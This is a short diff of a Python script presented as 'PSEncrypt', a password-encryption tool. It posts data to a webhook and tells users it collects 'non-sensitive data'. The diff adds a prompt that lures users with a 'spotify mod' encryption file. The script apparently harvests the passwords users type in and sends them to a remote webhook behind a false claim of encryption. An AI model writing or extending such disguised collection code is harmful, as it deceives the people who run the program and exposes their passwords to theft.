@@ -44,6 +44,9 @@ requests.post(webhook_url, json={"content": f"{initialWebsend}"})
 tn = "---[PSEncrypt0.0.1]:"
 
 print(f"{tn} Welcome to PSEncrypt! This program is designed to encrypt your password!")
+
+Optiona = input("Are you here to generate an encryption password for your spotify mod? Press enter and it will automatically generate an encryption file so that you can add your music! ")
+
 print(f"{tn} This program will only **ENCRYPT** your password. And Collect non-sensitive data for quick access to your account when booting up the program.")
 print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
 time.sleep(0.5)
